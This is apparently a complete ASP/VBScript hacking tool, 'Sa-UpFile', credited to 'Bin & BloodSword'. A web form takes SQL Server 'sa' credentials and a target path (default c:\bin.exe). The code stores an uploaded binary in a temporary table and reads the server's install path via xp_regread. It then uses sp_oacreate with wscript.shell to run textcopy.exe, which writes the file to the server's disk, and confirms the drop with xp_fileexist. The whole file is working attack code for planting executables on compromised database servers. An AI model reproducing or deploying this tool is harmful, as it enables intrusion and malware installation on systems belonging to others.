<SCRIPT RUNAT=SERVER LANGUAGE=VBSCRIPT>
dim Data_5xsoft

Class upload_5xsoft
  
dim objForm,objFile,Version

Public function Form(strForm)
   strForm=lcase(strForm)
   if not objForm.exists(strForm) then
     Form=""
   else
     Form=objForm(strForm)
   end if
 end function

Public function File(strFile)
   strFile=lcase(strFile)
   if not objFile.exists(strFile) then
     set File=new FileInfo
   else
     set File=objFile(strFile)
   end if
 end function
Private Sub Class_Initialize 
  dim RequestData,sStart,vbCrlf,sInfo,iInfoStart,iInfoEnd,tStream,iStart,theFile
  dim iFileSize,sFilePath,sFileType,sFormValue,sFileName
  dim iFindStart,iFindEnd
  dim iFormStart,iFormEnd,sFormName
  set objForm=Server.CreateObject("Scripting.Dictionary")
  set objFile=Server.CreateObject("Scripting.Dictionary")
  if Request.TotalBytes<1 then Exit Sub
  set tStream = Server.CreateObject("adodb.stream")
  set Data_5xsoft = Server.CreateObject("adodb.stream")
  Data_5xsoft.Type = 1
  Data_5xsoft.Mode =3
  Data_5xsoft.Open
  Data_5xsoft.Write  Request.BinaryRead(Request.TotalBytes)
  Data_5xsoft.Position=0
  RequestData =Data_5xsoft.Read 

  iFormStart = 1
  iFormEnd = LenB(RequestData)
  vbCrlf = chrB(13) & chrB(10)
  sStart = MidB(RequestData,1, InStrB(iFormStart,RequestData,vbCrlf)-1)
  iStart = LenB (sStart)
  iFormStart=iFormStart+iStart+1
  while (iFormStart + 10) < iFormEnd 
	iInfoEnd = InStrB(iFormStart,RequestData,vbCrlf & vbCrlf)+3
	tStream.Type = 1
	tStream.Mode =3
	tStream.Open
	Data_5xsoft.Position = iFormStart
	Data_5xsoft.CopyTo tStream,iInfoEnd-iFormStart
	tStream.Position = 0
	tStream.Type = 2
	tStream.Charset ="gb2312"
	sInfo = tStream.ReadText
	tStream.Close
	iFormStart = InStrB(iInfoEnd,RequestData,sStart)
	iFindStart = InStr(22,sInfo,"name=""",1)+6
	iFindEnd = InStr(iFindStart,sInfo,"""",1)
	sFormName = lcase(Mid (sinfo,iFindStart,iFindEnd-iFindStart))
	if InStr (45,sInfo,"filename=""",1) > 0 then
		set theFile=new FileInfo
		iFindStart = InStr(iFindEnd,sInfo,"filename=""",1)+10
		iFindEnd = InStr(iFindStart,sInfo,"""",1)
		sFileName = Mid (sinfo,iFindStart,iFindEnd-iFindStart)
		theFile.FileName=getFileName(sFileName)
		theFile.FilePath=getFilePath(sFileName)
		theFile.FileExt=GetFileExt(sFileName)
		iFindStart = InStr(iFindEnd,sInfo,"Content-Type: ",1)+14
		iFindEnd = InStr(iFindStart,sInfo,vbCr)
		theFile.FileType =Mid (sinfo,iFindStart,iFindEnd-iFindStart)
		theFile.FileStart =iInfoEnd
		theFile.FileSize = iFormStart -iInfoEnd -3
		theFile.FormName=sFormName
		if not objFile.Exists(sFormName) then
		  objFile.add sFormName,theFile
		end if
	else
		tStream.Type =1
		tStream.Mode =3
		tStream.Open
		Data_5xsoft.Position = iInfoEnd 
		Data_5xsoft.CopyTo tStream,iFormStart-iInfoEnd-3
		tStream.Position = 0
		tStream.Type = 2
		tStream.Charset ="gb2312"
	        sFormValue = tStream.ReadText 
	        tStream.Close
		if objForm.Exists(sFormName) then
		  objForm(sFormName)=objForm(sFormName)&", "&sFormValue		  
		else
		  objForm.Add sFormName,sFormValue
		end if
	end if
	iFormStart=iFormStart+iStart+1
	wend
  RequestData=""
  set tStream =nothing
End Sub

Private Sub Class_Terminate  
 if Request.TotalBytes>0 then
	objForm.RemoveAll
	objFile.RemoveAll
	set objForm=nothing
	set objFile=nothing
	Data_5xsoft.Close
	set Data_5xsoft =nothing
 end if
End Sub
   
 
 Private function GetFilePath(FullPath)
  If FullPath <> "" Then
   GetFilePath = left(FullPath,InStrRev(FullPath, "\"))
  Else
   GetFilePath = ""
  End If
 End  function

 Private function GetFileExt(FullPath)
  If FullPath <> "" Then
   GetFileExt = mid(FullPath,InStrRev(FullPath, ".")+1)
  Else
   GetFileExt = ""
  End If
 End  function
 
 Private function GetFileName(FullPath)
  If FullPath <> "" Then
   GetFileName = mid(FullPath,InStrRev(FullPath, "\")+1)
  Else
   GetFileName = ""
  End If
 End  function
End Class

Class FileInfo
  dim FormName,FileName,FilePath,FileSize,FileExt,FileType,FileStart
  Private Sub Class_Initialize 
    FileName = ""
    FilePath = ""
    FileSize = 0
    FileStart= 0
    FormName = ""
    FileType = ""
    FileExt  = ""
  End Sub
  Public function InFile()
  Data_5xsoft.position=FileStart
  InFile=Data_5xsoft.Read(FileSize)
  
  end function
  End Class
</SCRIPT>
<html>
<body>
<title>Sa-UpFile--==Bin==--</title>
<style type="text/css">
body,td{font: 12px Arial,Tahoma;line-height: 16px;}
input{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:20px;}
.bt {border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px;}
a {color: #00f;text-decoration:underline;}
a:hover{color: #f00;text-decoration:none;}
</style>
<form name="mainForm" enctype="multipart/form-data" action="" method="post">
<p>
Host:<input type="text" name=sahost  value="127.0.0.1" > Port:<input type="text" name=saport  value="1433" >
User:<input type="text" name=sauser value="sa" > Pass:<input type="text" name=sapass  value="sa">
DataBase:<input type="text" name=sadb  value="tempdb">
<p>
Path:<input type="text" name=savepath size=50 value="c:\bin.exe" ><p>
File: <input type=file name=myfile >
<input type=submit name=ok value="Upload" class="bt">
</form>
<p>
<%
'=============================Code by Bin & BloodSword================
dim upload,file,formName,formPath,iCount
set upload=new upload_5xsoft
set file=upload.file("myfile") 
   savepath = upload.form("savepath")
   sahost= upload.form("sahost")
   saport = upload.form("saport")
   sauser = upload.form("sauser")
   sapass = upload.form("sapass")
   sadb = upload.form("sadb")
if file.FileSize>0 then         
   
   indata = file.infile()
  'SQLEXECUTE 
   sqlstr = "PROVIDER=SQLOLEDB;server="&sahost&","&saport&";uid="&sauser&";pwd="&sapass&";database="&sadb&""
   execsql sqlstr,indata,savepath
end if
set file=nothing
'===============subsql===================
Sub execsql(sqlstr,indata,savepath)
set conn=server.CreateObject("ADODB.connection")
 conn.Open sqlstr
 conn.execute "IF EXISTS (SELECT * FROM sysobjects WHERE name='safile') BEGIN DROP TABLE [safile] END;"
 conn.execute "CREATE TABLE [safile] ([id] [int] NULL ,[safile] [Image] NULL) ON [PRIMARY] TEXTIMAGE_ON [PRIMARY];"
 set rs=server.createobject("ADODB.recordset")
 rs.Open "SELECT * FROM safile where id is null",conn,1,3
 rs.addnew
 rs("safile").appendchunk indata
 rs.update
  '===============update end==========
 set rs = conn.execute("EXEC master..xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\MSSQLServer\Setup', 'SQLPath'")
 regpath = rs(1)
 sql="declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'"""&(regpath)&"\Binn\textcopy.exe"" /S "&sahost&" /U "&sauser&" /P "&sapass&" /D "&sadb&" /T safile /C safile /W true /F """&savepath&""" /O',0,1"
conn.execute(sql)
conn.execute "IF EXISTS (SELECT * FROM sysobjects WHERE name='safile') BEGIN DROP TABLE [safile] END;"
set rs =conn.execute("EXECUTE master..xp_fileexist '"&savepath&"'")
'============
if rs(0)=1 then 
response.write "<font color=red>OK ! Good Luck ! :)</font>"
else
response.write "<font color=blue>Sorry ! Bad Luck ! ):</font>"
end if 
 
set rs = nothing
set conn = nothing
end sub
%>
<p>
Copyright &copy; 2009 Bin -- <a href="http://www.rootkit.net.cn" target="_blank">www.rootkit.net.cn</a>
</body>
</html> 